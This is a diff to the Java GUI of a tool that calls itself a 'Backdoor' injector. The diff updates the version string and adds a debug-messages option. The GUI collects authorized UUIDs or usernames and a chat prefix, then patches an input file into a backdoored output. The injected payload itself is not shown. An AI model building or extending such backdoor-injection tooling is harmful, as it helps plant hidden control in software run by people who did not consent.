@@ -34,8 +34,8 @@ public class InjectorGUI{
                 JOptionPane.showMessageDialog(
                         null,
                         "Created by: Thicc Industries,\n" +
-                                "Backdoor Version: 2.2.1\n" +
-                                "Release Date: March 4 2022\n" +
+                                "Backdoor Version: 2.2.2\n" +
+                                "Release Date: March 25 2022\n" +
                                 "License: GPL v3.0",
                         "Thicc Industries Injector",
                         JOptionPane.INFORMATION_MESSAGE
@@ -76,7 +76,7 @@ public class InjectorGUI{
         String UUIDList;
         String ChatPrefix;
         Boolean InjectOther;
-
+        Boolean Warnings;
         int usernames = JOptionPane.showConfirmDialog(null, "Use offline mode? (Usernames)", "Thicc Industries Injector", JOptionPane.YES_NO_OPTION);
         UUIDsAreUsernames = usernames == JOptionPane.YES_OPTION;
 
@@ -115,11 +115,17 @@ public class InjectorGUI{
                 JOptionPane.YES_NO_OPTION
         ) == JOptionPane.YES_OPTION;
 
+        Warnings = JOptionPane.showConfirmDialog(
+                null,
+                "Enable Debug Messages?\n[Please use this for github issues]",
+                "Thicc Industries Injector",
+                JOptionPane.YES_NO_OPTION
+        ) == JOptionPane.YES_OPTION;
         //Parse uuids
 
         String[] splitUUID = UUIDList.split(",");
 
-        Injector.SimpleConfig sc = new Injector.SimpleConfig(UUIDsAreUsernames, splitUUID, ChatPrefix, InjectOther);
+        Injector.SimpleConfig sc = new Injector.SimpleConfig(UUIDsAreUsernames, splitUUID, ChatPrefix, InjectOther, Warnings);
         boolean result2 = Injector.patchFile(InPath, OutPath, sc, true, false);
 
         if(result2){
